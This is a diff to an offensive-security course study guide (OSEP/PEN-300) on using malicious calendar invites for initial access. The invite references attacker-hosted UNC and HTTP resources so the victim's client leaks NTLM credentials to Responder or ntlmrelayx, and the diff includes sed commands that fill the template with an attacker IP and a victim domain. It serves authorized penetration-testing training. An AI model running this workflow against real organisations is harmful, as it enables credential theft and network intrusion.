@@ -6,7 +6,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 
 > One-liner: you know the recipient address, the target will process meeting invites, but there is no macro execution path → send an `.ics` invite that **references external resources**, so the calendar client fetches them on parse/render/reminder and authenticates; capture hashes with Responder on the attacker box, or relay with ntlmrelayx to another SMB target.
 >
-> Course chapter 5 (Initial Access / client-side); cheat-sheet keywords: `Relay Attacks`, `Capture Hashes` (see cheat sheet ~L6207 and ~L7381).
+> **Course mapping:** Chapter 5 (§5.1 Calendar as an Initial Access Vector / iCalendar RFC 5545, §5.2.1–5.2.2 crafting and automating the invite, §5.2.3 Credential Stealing with Responder). Relaying the captured authentication is covered in Chapter 20 §20.1.4 and Chapter 22 §22.2.2.
 >
 > **Core idea: whether auth fires depends on the calendar client version and config — “invite received / accepted” ≠ “auth will fire”. Require protocol-log evidence before moving on.**
 
@@ -75,8 +75,9 @@ Template `m16-ics-invite.ics` uses placeholders `LHOST` `URL` `USER` `DOMAIN`. B
 
 ```bash
 cd ~/osep/payloads/infra
-sed -e "s/LHOST/192.168.45.10/g" \
-    -e "s|URL|http://192.168.45.10|g" \
+sed -e "/^#/d" \
+    -e "s/LHOST/192.168.45.10/g" \
+    -e "s|https://URL|http://192.168.45.10|g" \
     -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
     -e "s/TOKEN/${TOKEN}/g" \
     m16-ics-invite.ics \
@@ -120,7 +121,7 @@ nmap -p 445 --script smb2-security-mode TARGET
 # Depends: Responder (SMB auth) or ntlmrelayx (relay) already running;
 #          optional HTTP token probe (python3 -m http.server 80)
 # Usage: sed-replace placeholders, then deliver, e.g.:
-#   sed -e "s/LHOST/192.168.45.10/g" -e "s|URL|http://192.168.45.10|g" \
+#   sed -e "/^#/d" -e "s/LHOST/192.168.45.10/g" -e "s|https://URL|http://192.168.45.10|g" \
 #       -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
 #       -e "s/TOKEN/m16-3f2a91/g" m16-ics-invite.ics > invite.ics
 #       Delivery: mail attachment .ics or inline text/calendar; METHOD=REQUEST
@@ -254,7 +255,7 @@ esac
 | `m16-ics-invite.ics` | Invite template (LOCATION=UNC, URL/ATTACH=https token, DESCRIPTION dual refs) | After placeholder replace, as mail attachment/inline |
 | `m16-auth-capture.sh` | Responder capture / ntlmrelayx relay one-shot (port checks, logs, hashcat hints) | Start on attacker before each delivery |
 
-Related: cheat sheet `Relay Attacks`, `Capture Hashes`; hash follow-on in [07-credentials-lsass](/modules/07-credentials-lsass) and [12-ad-attacks](/modules/12-ad-attacks).
+Related: PEN-300 (`pen-300.pdf`) Chapter 5 §5.2.3 *Credential Stealing with Responder*; NTLM relay in Chapter 20 §20.1.4 and Chapter 22 §22.2.2. Hash follow-on: [07-credentials-lsass](/modules/07-credentials-lsass) and [12-ad-attacks](/modules/12-ad-attacks).
 
 ---
 
